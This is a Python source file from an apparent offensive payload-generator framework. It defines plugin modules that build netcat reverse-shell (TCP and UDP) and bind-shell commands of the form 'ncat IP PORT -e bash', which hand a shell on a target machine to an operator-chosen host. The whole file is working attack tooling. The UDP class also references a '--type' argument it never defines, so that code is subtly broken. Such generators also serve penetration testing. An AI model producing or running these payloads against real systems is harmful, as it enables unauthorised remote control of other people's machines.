from ogabog.cores import plugin


class ReverseShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.add_args(
            "--shell",
            default="bash",
            choices=[
                'bash',
                'sh',
                'dash'
            ],
            help="Select shell type on target machine"
        )
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "[ReverseShell][TCP] Netcat"

    def make_shell(self):
        self.shell = "{} {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)


class ReverseShellUDP(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=[
                'bash',
                'sh',
                'dash'
            ],
            help="Select shell type on target machine"
        )
        self.add_args(
            "--ip",
            help="IP address"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "[ReverseShell][UDP] Netcat"

    def make_shell(self):
        self.shell = "{} --udp {} {} -e {}".format(self.args.type, self.args.ip, self.args.port, self.args.shell)


class BindShell(plugin.Module):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=[
                'bash',
                'sh',
                'dash'
            ],
            help="Select shell type on target machine"
        )
        self.add_args(
            "--type",
            default="ncat",
            choices=[
                'nc',
                'ncat'
            ],
            help="Select netcat type: tradition, ncat (default: ncat)"
        )
        self.add_args(
            "--port",
            help="Port address"
        )
        self.opts.description = "[BindShell][TCP] Netcat"

    def make_shell(self):
        self.shell = "{} -l {} -e {}".format(self.args.type, self.args.port, self.args.shell)
